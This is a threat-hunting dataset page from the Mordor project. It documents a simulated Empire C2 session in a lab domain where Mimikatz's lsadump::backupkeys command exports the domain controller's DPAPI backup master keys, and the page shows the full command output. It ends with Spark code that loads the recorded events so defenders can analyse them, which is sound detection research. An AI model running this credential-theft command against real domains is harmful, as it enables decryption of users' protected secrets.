# Empire Mimikatz Export Master Key

## Metadata


|                   |    |
|:------------------|:---|
| id                | SD-190518235535 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/05/18 |
| platform          | Windows |
| Mordor Environment| shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/OTRF/Blacksmith/blob/master/aws/mordor/cfn-files/scripts/Invoke-Mimikatz.ps1 |
| Mordor Dataset    | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_export_master_key.tar.gz |

## Dataset Description
This dataset represents adversaries using tools like Mimikatz to export the master key from the domain controller remotely.

## Adversary View
```
(Empire: powershell/credentials/mimikatz/command) > set Command lsadump::backupkeys /system:HFDC01.shire.com /export
(Empire: powershell/credentials/mimikatz/command) > execute
[*] Tasked 13GK9C5T to run TASK_CMD_JOB
[*] Agent 13GK9C5T tasked with task ID 1
[*] Tasked agent 13GK9C5T to run module powershell/credentials/mimikatz/command
(Empire: powershell/credentials/mimikatz/command) > Job started: DPB5F4
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::backupkeys /system:HFDC01.shire.com /export

Current prefered key:       {a1b58ded-16ec-4822-ab1c-3a4cfb9c268a}
  * RSA key
  Exportable key : YES
  Key size       : 2048
  Private export : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pvk'
  PFX container  : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.pfx'
  Export         : OK - 'ntds_capi_0_a1b58ded-16ec-4822-ab1c-3a4cfb9c268a.der'

Compatibility prefered key: {116228fd-901d-4386-853a-9611c3c93e28}
  * Legacy key
aff6c7adc1e0ddc685fae1fd657a1f6756df313f9b149f4af78949700de1022f
e921157be464fc5cd40ceec73694e565bcab123780f285a5cd678af40cf5f0bb
ec9e6b981966d12e5a7de25073fbb716a0e435d1dfee8c55bf5725172161f9d3
06f4e00ffa1bc37de63719a7e5173ce20b69dc2764664535435aab7afbc1d332
f0c7837839ab891efcb6dc9490746d35aab45efc5e72a7270186ae0260d1ad0f
28e5cbe391c9df45dd38e7e5681df55a216a2d50e4de0d8cdd33dde8806569ee
fe3e906081c4d1c18e4f42461133a2646fce2a37773ea15bbaae5fef01c0997e
f19dcfaf5582ab001056b8fe921c5f5c896f145fef1dfeda8ebe9ef4fd4fccdb

  Export         : OK - 'ntds_legacy_0_116228fd-901d-4386-853a-9611c3c93e28.key'

(Empire: powershell/credentials/mimikatz/command) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/empire_mimikatz_export_master_key.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        
